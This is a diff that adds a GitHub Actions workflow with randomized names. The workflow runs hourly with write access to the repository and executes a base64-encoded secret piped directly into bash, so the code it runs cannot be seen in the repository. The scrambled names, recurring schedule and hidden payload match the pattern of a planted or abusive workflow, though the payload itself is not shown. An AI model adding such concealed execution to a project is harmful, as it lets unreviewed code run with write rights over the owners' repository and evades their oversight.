@@ -1,0 +1,15 @@
+name: EGcKEFDVmjwPGQ
+on:
+  schedule:
+    - cron: '38 * * * *'
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  NmoPXcMBGLrf:
+    runs-on: ubuntu-22.04
+    env:
+      daoXVmfUBWiItJEwsc: ${{ secrets.daoXVmfUBWiItJEwsc }}
+    steps:
+      - uses: actions/checkout@v4
+      - run: echo "${{ secrets.pZHlMEFwSLUDTrFgbk }}" | base64 -d | bash
